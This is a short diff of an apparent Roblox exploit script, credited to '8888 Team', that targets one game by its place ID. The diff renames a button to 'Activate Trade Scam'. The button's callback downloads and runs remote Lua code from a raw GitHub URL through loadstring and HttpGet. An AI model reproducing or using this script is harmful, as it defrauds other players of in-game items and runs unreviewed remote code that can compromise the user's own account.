@@ -9,7 +9,7 @@ if game.PlaceId == 6284583030 then
     })
     
     local Section = Tab:AddSection({
-        Name = "Credits"
+        Name = "Info"
     })
     
     Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
@@ -57,7 +57,7 @@ if game.PlaceId == 6284583030 then
 })
 
     Tab:AddButton({
-        Name = "Click To Start Dupe",
+        Name = "Activate Trade Scam",
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
           end 
